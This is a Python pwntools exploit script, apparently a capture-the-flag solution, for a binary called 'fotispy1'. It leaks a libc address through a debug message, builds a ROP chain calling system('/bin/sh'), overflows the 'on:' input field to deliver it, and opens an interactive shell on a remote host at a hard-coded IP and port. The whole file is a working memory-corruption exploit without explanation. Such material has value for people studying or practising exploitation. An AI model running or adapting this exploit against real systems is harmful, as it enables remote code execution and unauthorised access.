from pwn import *
import warnings

warnings.filterwarnings('ignore')
context.log_level = 'CRITICAL'
context.binary = binary = ELF('./fotispy1', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def register():
	p.sendlineafter(b'[E]: ', b'0')
	p.sendlineafter(b'username: ', b'pwned')
	p.sendlineafter(b'password: ', b'pwned')

def login():
	p.sendlineafter(b'[E]: ', b'1')
	p.sendlineafter(b'username: ', b'pwned')
	p.sendlineafter(b'password: ', b'pwned')

def get_libc_leak():
	p.sendlineafter(b'[E]: ', b'2')
	p.recvuntil(b'[DEBUG] ')
	libc.address = int(p.recvline()[:-1], 16) - libc.symbols.printf
	print(f'libc base @ {hex(libc.address)}')
	p.sendlineafter(b'title: ', b'aaaa')
	p.sendlineafter(b'from: ', b'aaaa')
	p.sendlineafter(b'on: ', b'aaaa')

def build_rop_chain():
	r = ROP(libc)
	rc = p64(r.find_gadget(['pop rdi','ret'])[0])
	rc += p64(next(libc.search(b'/bin/sh\x00')))
	rc += p64(r.find_gadget(['ret'])[0])
	rc += p64(libc.symbols.system)
	return rc

def overflow():
	rc = build_rop_chain()

	p.sendlineafter(b'[E]: ', b'2')
	p.sendlineafter(b'title: ', b'A')
	p.sendlineafter(b'from: ', b'A')
	p.sendlineafter(b'on: ', b'A'*0xd+p64(0x404200)+b'A'*0x8+rc)

def trigger():
	p.sendlineafter(b'[E]: ', b'3')

#p = process()
p = remote('52.59.124.14', 5191)

register()
login()
get_libc_leak()
overflow()
trigger()

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
